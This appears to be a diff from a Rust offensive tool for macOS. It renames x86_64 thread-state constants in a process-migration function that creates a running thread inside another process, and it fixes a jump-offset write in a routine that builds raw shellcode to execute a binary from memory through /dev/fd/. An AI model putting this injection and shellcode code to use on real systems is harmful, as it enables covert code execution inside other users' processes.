@@ -857,8 +857,8 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     // x86_64 thread state
     #[cfg(target_arch = "x86_64")]
     {
-        const x86_THREAD_STATE64: u32 = 4;
-        const x86_THREAD_STATE64_COUNT: u32 = 42;
+        const X86_THREAD_STATE64: u32 = 4;
+        const X86_THREAD_STATE64_COUNT: u32 = 42;
 
         #[repr(C)]
         #[derive(Default)]
@@ -1005,9 +1005,9 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
             let mut new_thread: mach_port_t = 0;
             let kr = thread_create_running(
                 target_task,
-                x86_THREAD_STATE64,
+                X86_THREAD_STATE64,
                 &state as *const _ as *const u32,
-                x86_THREAD_STATE64_COUNT,
+                X86_THREAD_STATE64_COUNT,
                 &mut new_thread,
             );
             mach_port_deallocate(host, target_task);
@@ -1366,8 +1366,9 @@ fn build_macos_memfd_stub_x86_64(binary_addr: u64, binary_len: usize) -> Vec<u8>
     code.extend_from_slice(&[0x48, 0x85, 0xc0]);
     // jnz .itoa_loop (back to itoa_loop_start)
     code.extend_from_slice(&[0x75, 0x00]); // placeholder for rel8
+    let rel8_idx = code.len() - 1;
     let loop_size = (code.len() + 2 - itoa_loop_start) as u8;
-    code[code.len() - 1] = loop_size.wrapping_neg();
+    code[rel8_idx] = loop_size.wrapping_neg();
 
     // Prepend "/dev/fd/" in reverse order (last char first)
     for &ch in &[0x2f, 0x64, 0x66, 0x2f, 0x76, 0x65, 0x64, 0x2f] {
